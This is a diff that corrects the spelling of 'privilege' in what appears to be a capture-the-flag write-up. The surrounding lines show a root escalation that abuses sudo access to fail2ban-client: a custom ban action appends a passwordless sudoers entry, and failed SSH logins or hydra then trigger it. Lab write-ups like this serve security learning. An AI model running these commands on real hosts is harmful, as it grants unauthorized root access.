@@ -114,7 +114,7 @@ And we can see, it worked.
 Note:this might also work.
 [CVE-2023-30258](https://github.com/hadrian3689/)
 
-## Privelege Escalation
+## privilege Escalation
 
 Lets enumerate further.
 And doing `sudo -l`, we can see this.
@@ -150,7 +150,7 @@ After  trying different things and talking with AI.
 We could this.
 `sudo /usr/bin/fail2ban-client status`
 So the `fail2ban-client` is the tool for making a bruteforce attacks hard.
-So we will use it here to escalate our privelege.
+So we will use it here to escalate our privilege.
 
 First we will create our own action.
 `sudo /usr/bin/fail2ban-client set sshd addaction myaction`
@@ -161,7 +161,7 @@ Now we need to define what our custom action does.
 `sudo /usr/bin/fail2ban-client set sshd action myaction actionban "echo 'asterisk ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"`
 
 So here, `echo 'asterisk ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers` will triggered when sshd jail is triggered.
-So we set the sshd action to our action and which will do a specific action to stop or reduce attack but here we used it to escalate our privelege to root.
+So we set the sshd action to our action and which will do a specific action to stop or reduce attack but here we used it to escalate our privilege to root.
 ![](Pasted%20image%2020250308055753.png)
 
 And now we need to trigger that jail, So we can try to do failed ssh or use hydra for it.
